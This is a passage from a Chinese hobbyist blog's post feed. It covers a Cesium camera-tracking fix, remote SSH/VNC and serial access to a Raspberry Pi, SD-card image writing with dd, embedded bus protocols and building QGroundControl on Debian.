在Viewer组件的_onTick事件处理函数中，同样会更新被跟踪实体的摄像头位置。而Cesium摄像头跟踪飞机实体时产生晃动的根源即在此处。12345678910111213141516171819Viewer.prototype._onTick = function(clock) &#123; var time = clock.currentTime; var isUpdated = this._dataSourceDisplay.update(time); if (this._allowDataSourcesToSuspendAnimation) &#123; this._clockViewModel.canAnimate = isUpdated; &#125; var entityView = this._entityView; if (defined(entityView)) &#123; var trackedEntity = this._trackedEntity; var trackedState = this._dataSourceDisplay.getBoundingSphere(trackedEntity, false, boundingSphereScratch); if (trackedState === BoundingSphereState.DONE) &#123; entityView.update(time, boundingSphereScratch); &#125; &#125; ... &#125;; 可行的解决方案在Viewer组件的_onTick函数做如下修改：1234567891011121314151617181920212223Viewer.prototype._onTick = function(clock) &#123; var time = clock.currentTime; var isUpdated = this._dataSourceDisplay.update(time); if (this._allowDataSourcesToSuspendAnimation) &#123; this._clockViewModel.canAnimate = isUpdated; &#125; var entityView = this._entityView; if (defined(entityView)) &#123; var trackedEntity = this._trackedEntity; var trackedState = this._dataSourceDisplay.getBoundingSphere(trackedEntity, false, boundingSphereScratch); if (trackedState === BoundingSphereState.DONE) &#123; //entityView.update(time, boundingSphereScratch); var range=this.camera.distanceToBoundingSphere(boundingSphereScratch); var targetRange=range&gt;boundingSphereScratch.radius*10?range:boundingSphereScratch.radius*10; var offset=new HeadingPitchRange(0.0,-Math.toRadians(45.0),targetRange); this.camera.viewBoundingSphere(boundingSphereScratch,offset) &#125; &#125; ... &#125;; 参考文献 Cesium原理篇：1最长的一帧之渲染调度, by 法克鸡丝]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派学习之远程登录]]></title>
    <url>%2F2018%2F11%2F07%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%2F</url>
    <content type="text"><![CDATA[每次通过USB转串口登录树莓派比较麻烦，可以设置树莓派开启ssh和vnc服务，以便通过ssh或vnc远程登录树莓派。下面介绍在Debian中通过ssh或vnc远程登录树莓派的过程。 基础知识SSHSecure Shell（安全外壳协议，简称SSH）是一种加密的网络传输协议，可在不安全的网络中为网络服务提供安全的传输环境。SSH通过在网络中创建安全隧道来实现SSH客户端与服务器之间的连接。SSH最常见的用途是远程登录系统，人们通常利用SSH来传输命令行界面和远程执行命令。 SSH基本用法1234# 以用户名user，登录远程主机host$ ssh user@host# SSH的默认端口是22。使用p参数，可以修改这个端口。$ ssh -p 2222 user@host SSH通信过程及风险SSH采用了公钥加密保证安全。 整个过程是这样的：（1）远程主机收到用户的登录请求，把自己的公钥发给用户。（2）用户使用这个公钥，将登录密码加密后，发送回来。（3）远程主机用自己的私钥，解密登录密码，如果密码正确，就同意用户登录。 这个过程本身是安全的，但是实施的时候存在”中间人攻击”风险：如果有人截获了登录请求，然后冒充远程主机，将伪造的公钥发给用户，那么用户很难辨别真伪。因为不像https协议，SSH协议的公钥是没有证书中心（CA）公证的，也就是说，都是自己签发的。 VNCVNC（Virtual Network Computing），为一种使用RFB协议的显示屏画面分享及远程操作软件。此软件借由网上，可发送键盘与鼠标的动作及即时的显示屏画面。 VNC与操作系统无关，因此可跨平台使用，例如可用Windows连线到某Linux的计算机，反之亦同。甚至在没有安装客户端程序的计算机中，只要有支持JAVA的浏览器，也可使用。 原理VNC系统由客户端，服务端和一个协议组成 VNC的服务端目的是分享其所运行机器的屏幕，服务端被动的允许客户端控制它。VNC客户端（或Viewer）观察控制服务端，与服务端交互。VNC协议Protocol（RFB）是一个简单的协议，传送服务端的原始图像到客户端（一个X,Y位置上的正方形的点阵数据），客户端传送事件消息到服务端。 服务器发送小方块的帧缓存给客户端，在最简单的情况，VNC协议使用大量的带宽，因此各种各样的方法被发明出来减少通讯的开支，举例来说，有各种各样的编码方法来决定最有效率的方法来传送这些点阵方块。 VNC默认使用TCP端口5900至5906，而JAVA的VNC客户端使用5800至5806。一个服务端可以在5900端口用“监听模式”连接一个客户端，使用监听模式的一个好处是服务端不需要设置防火墙。 安全性VNC并非是安全的协议，虽然VNC伺服程序需设置密码才可接受外来连线，且VNC客户端与VNC伺服程序之间的密码传输经过加密，但仍可被轻易的拦截到并使用暴力破解法破解。不过VNC可设计以SSH或VPN传输，以增加安全性。 VNC软件由于VNC以GPL授权，派生出了几个VNC软件： RealVNC：由VNC团队部分成员开发，分为全功能商业版及免费版。 TightVNC：强调节省带宽使用。 UltraVNC：加入了TightVNC的部分程序及加强性能的图型映射驱动程序，并结合Active Directory及NTLM的账号密码认证，但仅有Windows版本。 Vine Viewer：MacOSX的VNC客户端。 配置树莓派支持SSH和VNC通过USB转串口登录树莓派后，按如下步骤开启SSH和VNC： 运行命令raspi-config 1sudo raspi-config 选择第五项Interfacing Options 选择enable SSH 启用SSH，重复步骤一和二，再选择enable VNC。 通过SSH或VNC连接树莓派debian主机与树莓派在同一个局域网内，则按如下步骤通过SSH或VNC连接树莓派。 通过nmap命令获取树莓派ip地址1234567891011$ nmap 192.168.0.1/24Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-08 13:08 CSTNmap scan report for 192.168.0.103Host is up (0.041s latency).Not shown: 998 closed portsPORT STATE SERVICE22/tcp open ssh5900/tcp open vncNmap done: 256 IP addresses (6 hosts up) scanned in 35.77 seconds 开启22和5900端口的主机即是树莓派。 通过ssh远程登录树莓派 12# 首次登录会给出主机认证不能建立的提示，输入yes可继续，再输入用户密码即可远程登录树莓派$ ssh pi@192.168.0.103 通过vnc远程登录树莓派 通过ssh登录树莓派后查看其使用的vnc程序 123$ apt list --installed | grep vncrealvnc-vnc-server/now 6.3.1.36657 armhf [已安装，可升级至：6.3.2.39069]# 可知，树莓派上使用realvnc程序 在Debian上安装realvnc客户端程序realvnc-vnc-viewer 在终端输入vncviewer，输入树莓派ip、用户名、密码即可登录树莓派 参考文献 http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html， by 阮一峰 https://zh.wikipedia.org/zh-hans/Secure_Shell， by wikipedia https://zh.wikipedia.org/zh-hans/VNC， by wikipedia]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派学习之USB转串口]]></title>
    <url>%2F2018%2F11%2F05%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AD%A6%E4%B9%A0%E4%B9%8BUSB%E8%BD%AC%E4%B8%B2%E5%8F%A3%2F</url>
    <content type="text"><![CDATA[最近研究树莓派，需要通过usb转串口去连接树莓派，然后设置其wifi连接。于是将用到计算机硬件知识整理一下，并记录通过usb转串口设置树莓派wifi连接的过程。 硬件知识计算机硬件常用接口有并口和串口，对应串行通信和并行通信。串行通信（英语：Serial communication）是指在计算机总线或其他数据信道上，每次传输一个比特数据，并连续进行以上单次过程的通信方式。与之对应的是并行通信，它在串行端口上通过一次同时传输若干比特数据的方式进行通信。 串行通信被用于长距离通信以及大多数计算机网络，在这些应用场合里，电缆和同步化使并行通信实际应用面临困难。凭借着其改善的信号完整性和传播速度，串行通信总线正在变得越来越普遍，甚至在短程距离的应用中，其优越性已经开始超越并行总线不需要串行化组件(serializer)，并解决了诸如时钟偏移（Clock skew）、互联密度（interconnect density）等缺点。PCI到PCI Express的升级就一个例子。 并口并行接口，简称并口。并口采用的是25针D形接头。所谓“并行”，是指8位数据同时通过并行线进行传送，这样数据传送速度大大提高，但并行传送的线路长度受到限制，因为长度增加，干扰就会增加，数据也就容易出错，目前，并行接口主要作为打印机端口等。 串口串口叫做串行接口，也称串行通信接口，即COM口。按电气标准及协议来分包括RS-232-C、RS-422、RS485、USB等。 RS-232-C、RS-422与RS-485标准只对接口的电气特性做出规定，不涉及接插件、电缆或协议。 串行端口可以用于连接外置调制解调器、绘图仪或串行打印机。它也可以控制台连接的方式连接网络设备，例如路由器和交换机，主要用来配置它们。 RS-232-C 也称标准接口，是目前最常用的一种串行通讯接口。它是在1970年由美国电子工业协会（EIA）联合贝尔系统、 调制解调器厂家及计算机终端生产厂家共同制定的用于串行通讯的标准。 传统的RS-232-C接口标准有22根线，采用标准25芯D型插头座。自IBM PC/AT开始使用简化了的9芯D型插座。计算机一般有两个串行口：COM1和COM2，9针D形接口通常在计算机后面能看到。现在有很多手机数据线或者物流接收器都采用COM口与计算机相连。 RS-422 为改进RS-232通信距离短、速率低的缺点，RS-422定义了一种平衡通信接口，将传输速率提高到10Mb/s，传输距离延长到4000英尺（速率低于100kb/s时），并允许在一条平衡总线上连接最多10个接收器。 RS-485 为扩展应用范围，EIA又于1983年在RS-422基础上制定了RS-485 标准，增加了多点、双向通信能力，即允许多个发送器连接到同一条总线上，同时增加了发送器的驱动能力和冲突保护特性，扩展了总线共模范围，后命名为 TIA/EIA-485-A标准。 Universal Serial Bus（通用串行总线） 简称USB，是目前计算机上应用较广泛的接口规范，由Intel、Microsoft、Compaq、IBM、NEC、Northern Telcom等几家大厂商发起的新型外设接口标准。USB接口是计算机主板上的一种四针接口，其中中间两个针传输数据，两边两个针给外设供电。USB接口速度快、连接简单、不需要外接电源，传输速度12Mbps，新的USB 2.0可达480Mbps；电缆最大长度5米，USB电缆有4条线：2条信号线，2条电源线，可提供5伏特电源，USB电缆还分屏蔽和非屏蔽两种，屏蔽电缆传输速度可达12Mbps，价格较贵，非屏蔽电缆速度为1.5Mbps，但价格便宜；USB通过串联方式最多可串接127个设备；支持热插拔。最新的规格是USB 3.1。 RJ-45接口 是以太网最为常用的接口，RJ45是一个常用名称，指的是由IEC(60)603-7标准化，使用由国际性的接插件标准定义的8个位置（8针）的模块化插孔或者插头。 USB转串口原理硬件接口电气特性 TTL电平：一般用作数字芯片的电平，例如芯片的供电电压是5V，那么高电平就是5V，低电平就是0V，这里所说的电平，就是TTL电平。 232电平：232电平特制电脑串口的电平，-12V左右为正电平，+12V左右为低电平。我们刚才所见到的“USB转串口线”和电脑原生的串口，就是232电平。 USB转串口方法PC的串口电气特性是232电平，单片机的串口电气特性是TTL电平，这两个就不一样，肯定需要某个芯片或者电路来进行转换匹配才可以通信。这个时候我们就需要TTL转232芯片了，常见的是MAX232,MAX3232等。连接方式如下: 但是随着USB接口的普及，当前计算机已经取消了串口。为实现232到TTL的转换，又需要USB转232。连接方式如下： 为简化，可将USB转232和232转TTL集成到一个芯片上。这样的芯片常见的有CH340、PL2303。连接方式如下： 常见的CH340芯片如下图所示： 通过USB转串口连接树莓派下面介绍在Debian Linux主机通过USB转串口连接树莓派的过程。 配置树莓派开启串口通信将树莓派操作系统镜像烧录到SD卡后，打开boot分区，编辑其config.txt，在其末尾添加如下代码，以开启串口通信权限。1enable_uart=1 通过USB转串口物理连接树莓派通过将USB转串口将Debian主机和树莓派物理连接好之后，给树莓派加电启动。 查看Debian系统能否识别ch340芯片在官方Linux内核版本中自Kernel2.6以后就默认包含了对CH340/CH341芯片的驱动支持。在系统的默认驱动目录/lib/modules/$(uname -r)/kernel/drivers内可找到ch340芯片的驱动文件ch341.ko。 使用命令lsusb或dmesg查看linux系统是否识别USB转串口硬件。12345678~$ lsusbBus 002 Device 001: ID 1d6b:0003 Linux Foundation 3.0 root hubBus 001 Device 005: ID 0bda:0129 Realtek Semiconductor Corp. RTS5129 Card Reader ControllerBus 001 Device 004: ID 8087:0a2a Intel Corp. Bus 001 Device 003: ID 1bcf:2b8a Sunplus Innovation Technology Inc. Bus 001 Device 006: ID 1a86:7523 QinHeng Electronics HL-340 USB-Serial adapterBus 001 Device 002: ID 046d:c062 Logitech, Inc. M-UAS144 [LS1 Laser Mouse]Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub Bus 001 Device 006: ID 1a86:7523 QinHeng Electronics HL-340 USB-Serial adapter表明Linux系统识别了usb转串口线缆，芯片类型为HL-340。 ‘dmesg’命令显示linux内核的环形缓冲区信息，我们可以从中获得诸如系统架构、cpu、挂载的硬件，RAM等多个运行级别的大量的系统信息。当计算机启动时，系统内核（操作系统的核心部分）将会被加载到内存中。在加载的过程中会显示很多的信息，在这些信息中我们可以看到内核检测硬件设备。运行dmesg，输出如下：1234567891011~$ sudo dmesg | tail[ 4248.441104] usbcore: registered new interface driver usbserial_generic[ 4248.441112] usbserial: USB Serial support registered for generic[ 4248.456079] usbcore: registered new interface driver ch341[ 4248.456088] usbserial: USB Serial support registered for ch341-uart[ 4248.456097] ch341 1-3:1.0: ch341-uart converter detected[ 4248.456464] usb 1-3: ch341-uart converter now attached to ttyUSB0[ 4284.405593] i2c_hid i2c-ELAN1010:00: i2c_hid_get_input: incomplete report (14/65535)[ 4284.407844] i2c_hid i2c-ELAN1010:00: i2c_hid_get_input: incomplete report (14/65535)[ 4657.772761] i2c_hid i2c-ELAN1010:00: i2c_hid_get_input: incomplete report (14/65535)[ 4657.774969] i2c_hid i2c-ELAN1010:00: i2c_hid_get_input: incomplete report (14/65535) [ 4248.456097] ch341 1-3:1.0: ch341-uart converter detected;[ 4248.456464] usb 1-3: ch341-uart converter now attached to ttyUSB0说明linux系统识别了usb转串口适配器，并附加到ttyUSB0文件上。 使用minicom连接树莓派minicom是linux平台的串行通信程序，类似于windows的超级终端程序。1234567891011121314151617181920212223242526272829$ usermod -a -G dialout $USER#首次运行minicom使用-s选项，用于设置串行通信参数$ minicom -s+-----[configuration]------+| Filenames and paths || File transfer protocols || Serial port setup || Modem and dialing || Screen and keyboard || Save setup as dfl || Save setup as.. || Exit || Exit from Minicom |+--------------------------+#通过上下键选择Serial port setup+----------------------------------- +| A - Serial Device : /dev/ttyUSB0 || B - Lockfile Location : /var/lock || C - Callin Program : || D - Callout Program : || E - Bps/Par/Bits : 115200 8N1 || F - Hardware Flow Control : Yes || G - Software Flow Control : No || || Change which setting? |+----------------------------------+# 设置Serial Device为/dev/ttyUSB0，然后推出到上一界面，使用enter键Save setup as dfl，保存配置。下次即可直接运行minicom使用之前保存的配置进行串口通信 # 这时候要选择单独Exit（退出），不要选择Exit from Minicom（退出Minicom），不然你就把minicom关了。# 这时即可连接树莓派。 连接上树莓派后，输入用户名pi和密码raspberry，即可进入系统。1234567891011121314151617Raspbian GNU/Linux 9 raspberrypi ttyS0 raspberrypi login: pi Password: Last login: Tue Oct 9 13:12:40 UTC 2018 on tty1 Linux raspberrypi 4.14.71-v7+ #1145 SMP Fri Sep 21 15:38:35 BST 2018 armv7l The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Wi-Fi is disabled because the country is not set. Use raspi-config to set the country before use. pi@raspberrypi:~$ 退出minicom，按Ctrl＋A，再按下X键，会提示你是否退出，yes就可以了。 配置树莓派wifi连接查看周围wifi热点信息1pi@raspberrypi:~$ iwlist scan 配置连接到wifi热点123456789101112# 编辑wifi文件pi@raspberrypi:~$ sudo vi /etc/wpa_supplicant/wpa_supplicant.conf# 在该文件最后添加下面的话network=&#123; ssid=&quot;WIFINAME&quot; psk=&quot;password&quot;&#125;# 引号部分分别为wifi的名字和密码# 重启系统pi@raspberrypi:~$ sudo init 6# 登录后查看是否连接成功pi@raspberrypi:~$ ip addr 参考文献 https://www.cnblogs.com/zcshan/archive/2010/12/03/com.html ,by 水寒 https://zh.wikipedia.org/wiki串行端口 , by wikipedia https://blog.csdn.net/he_wen_jie/article/details/50983076. by hwj666 https://linux.cn/article-3587-1.html , by linux中国 https://blog.csdn.net/JAZZSOLDIER/article/details/70170466 ， by SoldierJazz2018 http://blog.51cto.com/irinilu/289622, by feng9422 Pipci. Linux 串口终端调试工具minicom[EB/OL].https://blog.csdn.net/Pipcie/article/details/79379451, 2018-02-26. https://blog.csdn.net/huayucong/article/details/51376279， by huayucong USB转串口CH340接线方法,2015-11-03.]]></content>
      <tags>
        <tag>硬件</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派操作系统镜像烧录方法指南]]></title>
    <url>%2F2018%2F11%2F03%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%95%9C%E5%83%8F%E7%83%A7%E5%BD%95%E6%96%B9%E6%B3%95%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[树莓派是一个微型计算机硬件平台，为使其正常工作还需要安装操作系统。通常将树莓派操作系统烧录到SD卡上，再将SD卡插到树莓派上。加电启动后，树莓派就会从SD卡引导启动操作系统，开始工作。这里SD卡就相当于普通计算机的硬盘。下面记录在Debian Linux下烧录树莓派操作系统到SD卡的方法。 镜像烧录工具EtcherEtcher是树莓派官方推荐的镜像烧录工具。它采用图形界面，支持Windows、Linux、Mac，使用简单方便，推荐普通用户使用。 ddLinux的dd命令用于复制文件并对原文件的内容进行转换和格式化处理。dd命令功能很强大的，对于一些比较底层的问题，使用dd命令往往可以得到出人意料的效果。用的比较多的还是用dd来备份裸设备。同样也可用dd命令烧录系统镜像。 使用dd命令必须非常小心，如果输出指定了错误分区，将摧毁该分区的所有数据。 Linux下镜像烧录过程使用Etcher烧录镜像比较简单，重点介绍使用dd命令烧录镜像的方法。 查找sd卡设备可使用lsblk或者fdisk命令查找sd卡存储设备。需要注意的是： 块设备以/dev/sdX命名，其中X是小写字母，例如/dev/sda。 测试时发现当计算机只有usb3.0接口时，将不识别usb2.0的sd读卡器。 烧录镜像到sd卡将镜像烧录到sd卡使用如下dd命令将树莓派镜像少量到sd卡：1dd bs=4M if=2018-10-09-raspbian-stretch.img of=/dev/sdX conv=fsync 其中： if=文件名：输入文件名，缺省为标准输入。即指定源文件。 of=文件名：输出文件名，缺省为标准输出。即指定目的文件。 bs=bytes：同时设置读入/输出的块大小为bytes个字节。 conv=conversion：用指定的参数转换文件。 将压缩镜像烧录到sd卡当文件系统不支持大于4GB的文件时，可使用利用管道技术烧录镜像，命令如下：1unzip -p 2018-10-09-raspbian-stretch.zip | sudo dd of=/dev/sdX bs=4M conv=fsync 检查烧录进度默认情况下dd命令不给出烧录进度信息，最新的dd提供status=progress选项给出进度信息，命令如下：1dd bs=4M if=2018-10-09-raspbian-stretch.img of=/dev/sdX status=progress conv=fsync 或者可使用dcfldd命令替换dd进行烧录操作。 检查镜像是否正确的烧录到sd卡先使用dd命令将sd卡中内容复制到硬盘，在使用diff或者md5sum检查镜像文件与sd卡内容镜像之间的一致性。 之前dd命令烧录镜像到sd卡完成后会在shell中输出如下结果：123xxx+0 records inyyy+0 records outyyyyyyyyyy bytes (yyy kB, yyy KiB) copied, 0.00144744 s, 283 MB/s xxx是我们需要的，表示读取xxx块记录烧录到sd卡，xxx乘以bs=4M应该等于原始镜像的大小。 使用如下命令复制sd卡内容到硬盘上：12# 经测试count命令没有其作用，该命令将整个sd内容复制到了硬盘，但我们期望只复制之前烧录到sd卡内容dd bs=4M if=/dev/sdX of=from-sd-card.img count=xxx 如果from-sd-card.img文件大于原始镜像文件，那么先使用truncate命令将from-sd-card.img缩小到原始镜像文件的大小，命令如下：1truncate --reference 2018-10-09-raspbian-stretch.img from-sd-card.img 使用diff命令比较两者直接的一致性，如果不一致，可能烧录过程中有错误。1diff -s from-sd-card.img 2018-10-09-raspbian-stretch.img 使用sync命令强制将缓存写入硬盘，然后umount sd卡文件系统，最后移除sd卡。 参考文献 https://www.raspberrypi.org/documentation/installation/installing-images/linux.md, by raspberrypi. https://blog.csdn.net/liumang_D/article/details/3899462, by liumang_d. https://linux.cn/article-8024-1.html, by linux中国 https://www.jianshu.com/p/ff09ceffa816, by 二石兄.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>硬件</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派学习笔记]]></title>
    <url>%2F2018%2F11%2F03%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[WiringPi简介WiringPi是应用于树莓派平台的GPIO控制库函数，WiringPi遵守GUN Lv3。wiringPi使用C或者C++开发并且可以被其他语言包转，例如python、ruby或者PHP等。WiringPi中的函数类似于Arduino的wiring系统，这使得熟悉arduino的用户使用wringPi更为方便。 树莓派具有26个普通输入和输出引脚。在这26个引脚中具有8个普通输入和输出管脚，这8个引脚既可以作为输入管脚也可以作为输出管脚。除此之外，树莓派还有一个2线形式的I2C、一个4线形式的SPI和一个UART接口。树莓派上的I2C和SPI接口也可以作为普通端口使用。如果串口控制台被关闭便可以使用树莓派上的UART功能。如果不使用I2C，SPI和UART等复用接口，那么树莓派总共具有8+2+5+2 =17个普通IO。 wiringPi包括一套gpio控制命令，使用gpio命令可以控制树莓派GPIO管脚。用户可以利用gpio命令通过shell脚本控制或查询GPIO管脚。wiringPi是可以扩展的，可以利用wiringPi的内部模块扩展模拟量输入芯片，可以使用MCP23x17/MCP23x08（I2C 或者SPI）扩展GPIO接口。另外可通过树莓派上的串口和Atmega（例如arduino等）扩展更多的GPIO功能。另外，用户可以自己编写扩展模块并把自定义的扩展模块集成到wiringPi中。WiringPi支持模拟量的读取和设置功能，不过在树莓派上并没有模拟量设备。但是使用WiringPi中的软件模块却可以轻松地应用AD或DA芯片。 I2CI²C（Inter-Integrated Circuit）字面上的意思是集成电路之间，它其实是I²C Bus简称，所以中文应该叫集成电路总线，它是一种串行通信总线，使用多主从架构，由飞利浦公司在1980年代为了让主板、嵌入式系统或手机用以连接低速周边设备而发展。I²C的正确读法为“I平方C”（”I-squared-C”），而“I二C”（”I-two-C”）则是另一种错误但被广泛使用的读法。自2006年10月1日起，使用I²C协议已经不需要支付专利费，但制造商仍然需要付费以获取I²C从属设备地址。 设计说明I²C只使用两条双向漏极开路（Open Drain）（串行数据（SDA）及串行时钟频率（SCL））并利用电阻将电位上拉。I²C允许相当大的工作电压范围，但典型的电压准位为+3.3V或+5v。 I²C的参考设计使用一个7比特长度的地址空间但保留了16个地址，所以在一组总线最多可和112个节点通信[a]。常见的I²C总线依传输速率的不同而有不同的模式：标准模式（100 Kbit/s）、低速模式（10 Kbit/s），但时钟频率可被允许下降至零，这代表可以暂停通信。而新一代的I²C总线可以和更多的节点（支持10比特长度的地址空间）以更快的速率通信：快速模式（400 Kbit/s）、高速模式（3.4 Mbit/s）。 虽然最大的节点数目是被地址空间所限制住，但实际上也会被总线上的总电容所限制住，一般而言为400 pF。 如上所述，参考设计为使用串行数据线（SDA）和串行时钟线（SCL）、拥有7bit寻址空间的总线。 总线上有两种类型角色的节点： 主节点 - 产生时钟并发起与从节点的通信 从节点 - 接收时钟并响应主节点的寻址 该总线是一种多主控总线，即可以在总线上放置任意多主节点。此外，在停止位（STOP）发出后，一个主节点也可以成为从节点，反之亦然。 总线上有四种不同的操作模式，虽然大部分设备只作为一种角色和使用其中两种操作模式： 主节点发送 - 主节点发送数据给从节点 主节点接收 - 主节点接收从节点数据 从节点发送 - 从节点发送数据给主节点 从节点接收 - 从节点接收主节点数据 一开始，主节点处于主节点发送模式，发送起始位（START），跟着发送希望与之通信的从节点的7bit位地址，最后再发送一个bit读写位，该数据位表示主节点想要与从节点进行读（1）还是写（0）操作。 如果从节点在总线上，它将以ACK字符比特位应答（低有效）该地址。主节点收到应答后，根据它发送的读写位，处于发送模式或者接收模式，从节点则处于对应的相反模式（接收或发送）。 地址和数据首先发送最高有效位。 起始位在SCL位高时，由SDA上电平从高变低表示；停止位在SCL为高时，由SDA上电平从低变高表示。其他SDA上的电平变化在SCL为低时发生。 如果主节点想要向从节点写数据，它将发送一个字节，然后从节点以ACK位应答，如此重复。此时，主节点处于主节点发送模式，从节点处于从节点接收模式。 如果主节点想要读取从节点数据，它将不断接收从节点发送的一个个字节，在收到每个字节后发送ACK进行应答，除了接收到的最后一个字节。此时，主节点处于主节点接收模式，从节点处于从节点发送模式。 此后，主节点要么发送停止位终止传输，要么发送另一个START比特以发起另一次传输（即“组合消息”）。 应用I²C被应用在简单且其制造成本较传输速度更为重要的外设上。一些常见的应用如下： 为了保存用户的设置而访问NVRAM芯片。 访问低速的数字模拟转换器（DAC）。 访问低速的模拟数字转换器（ADC）。 改变监视器的对比度、色调及色彩平衡设置（视频数据通道）。 改变音量大小。 获取硬件监视及诊断数据，例如中央处理器的温度及风扇转速。 读取实时时钟（Real-time clock）。 在系统设备中用来打开或关闭电源供应。 I²C的另一个强大用途在于微控制器的应用，利用两根通用的输入输出接脚及软件的规划，可以让微控制器控制一个小型网络。 外设可以在系统仍然在运作的同时加入或移出总线，这代表对于有热插拔需求的设备而言是个理想的总线。 像I²C这样的总线之所以流行起来，是因为计算机工程师发现到对于集成电路设计而言，许多的制造成本源自于封装尺寸及接脚数量。更小的包装通常能够减少重量及电源的消耗，这对于移动电话及手持式计算机而言格外重要。 UART在通信和计算机科学中，Serial communication是一个通用概念，泛指所有的串行的通信协议，如RS232、USB、I2C、SPI、1-Wire、Ethernet等。这里的串行（serial），是相对并行通信（parallel communication）来说的，如下图： 理解串行通信的概念之后，大家可能会有疑问：接收方接收到一长串的、表示0/1电平跳变的信号之后，怎么还原出有效的信息呢？有两种方法： 发送端在发送串行数据的同时，提供一个时钟信号，并按照一定的约定（例如在时钟信号的上升沿的时候，将数据发送出去）发送数据，接收端根据发送端提供的时钟信号，以及大家的约定，接收数据。这就是常说的同步串行通信（Synchronous serial communication），I2C、SPI等有时钟信号的协议，都属于这种通信方式。本文不再详述。 发送端在数据发送之前和之后，通过特定形式的信号（例如START信号和STOP信号），告诉接收端，可以开始（或者停止）接收数据了。与此同时，收发两方会约定一个数据发送的速度（就是大名鼎鼎的波特率），发送端在发送START信号之后，就按照固定的节奏发送串行数据，与此同时，接收端在收到START信号之后，也按照固定的节奏接收串行数据。这就是常说的异步串行通信（Asynchronous serial communication），我们本节的主角——串口通信，就是这种通信方式。 UART(Universal Asynchronous Receiver/Transmitter) 即是规定编码格式、bit rate，产生通信所需的bit流的标准。 SPI串行外设接口（Serial Peripheral Interface Bus，SPI），是一种用于短程通信的同步串行通信接口规范，主要应用于单片机系统中。类似I²C。 这种接口首先被Motorola（摩托罗拉）公司开发，然后发展成了一种行业规范。典型应用包含SD卡和液晶显示器。 SPI设备之间使用全双工模式通信，包含一个主机和一个或多个从机。主机产生待读或待写的帧数据，多个从机通过一个片选线路 决定哪个来响应主机的请求。 有时SPI接口被称作四线程接口，SPI准确来讲称为同步串行接口，但是与同步串行接口协议（SSI）不同，SSI是一个四线程 同步通信协议，但是使用差分信号输入同时仅提供一个单工通信信道。 接口SPI总线规定了4个保留逻辑信号接口： SCLK（Serial Clock）：串列时脉，由主机发出 MOSI（Master Output,Slave Input）：主机输出从机输入信号，由主机发出 MISO（Master Input,Slave Output）：主机输入从机输出信号，由从机发出 SS（Slave Selected）：选择信号，由主机发出，一般是低电位有效 尽管上面的引脚名称是最常用的，但在过去，有时会使用其他引脚命名约定，因此旧IC产品的SPI端口引脚名称可能有所不同。 1-Wire1-Wire是Maxim子公司达拉斯半导体的专利技术，仅用单一信号线就可像I²C、SPI一样，传输时钟（clock）又传输数据（data），并且数据传输是双向的。1-Wire使用较低的数据传输速率，通常是用来沟通小型设备，如数字温度计。1-Wire有两种速率：标准模式16kbps，驱动模式142kbps。 单总线只有一根数据线。设备主机或从机通过一个漏极开路或三态端口连接至该数据线，这样允许设备在不发送数据时释放数据总线，以便总线被其它设备所使用。单总线端口为漏极开路其内部等效电路如下图所示。 参考文献 树莓派学习笔记——wiringPi简介、安装和管脚说明 , by xukai871105. I²C, by wikipedia. UART、RS232、TTL关系浅析, by 老狼. 串行外设接口,by wikipedia. 1-Wire,by wikipedia. 1-Wire单总线的基本原理,by ce123. 解析单总线协议（1-wire）,by zhengqijun_.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>硬件</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Debian下编译QGroundControl源码]]></title>
    <url>%2F2018%2F11%2F01%2FDebian%E4%B8%8B%E7%BC%96%E8%AF%91QGroundControl%E6%BA%90%E7%A0%81%2F</url>
    <content type="text"><![CDATA[MAVLink（Micro Air Vehicle Link，微型空中飞行器链路通讯协议）是无人飞行器与地面站之间通讯，以及无人飞行器之间通讯最常用的协议。它已经在PX4、APM、PIXHAWK和Parrot AR.Drone飞控平台上进行了大量测试。 QGroundControl则是一种操纵基于MAVLink通信协议的无人机的跨平台地面站开源软件。下面记录在Debian Linux下从源码编译QGroundControl的过程。 下载源码1234# 下载QGroundControl源码git clone --recursive https://github.com/mavlink/qgroundcontrol.git# 更新子模块git submodule update 安装编译环境 下载Qt社区版在线安装器，安装5.11.0版本的Qt，安装路径可在/opt下。 1234# 注意要选择安装5.9+以上版本的Qt，因为构建QGC时需要# 运行qtcreater$ cd /opt/Qt/Tools/QtCreator/bin/$ ./qtcreator 安装必要的包 1sudo apt-get install speech-dispatcher libudev-dev libsdl2-dev 解决编译时libQt5PositioningQuick.so.5不存在的bug 123sudo apt-get install libqt5positioningquick5sudo find /usr/ -name libQt5PositioningQuick.so.5cp /usr/lib/x86_64-linux-gnu/libQt5PositioningQuick.so.5 /opt/Qt/5.10.0/gcc_64/lib/libQt5PositioningQuick.so.5 将当前用户添加到dialout组，获取串口访问权限 12# 运行QGroundControl需要当前用户拥有串口访问权限sudo usermod -a -G dialout $USER 编译运行打开Qt Creater，打开qgroundcontrol.pro工程，构建后运行，即可打开QGroundControl地面站软件。 参考链接 https://blog.csdn.net/hebbely/article/details/79022799, by hebbely https://dev.qgroundcontrol.com/en/getting_started/, by Dronecode]]></content>
      <tags>
        <tag>linux</tag>
        <tag>无人机</tag>
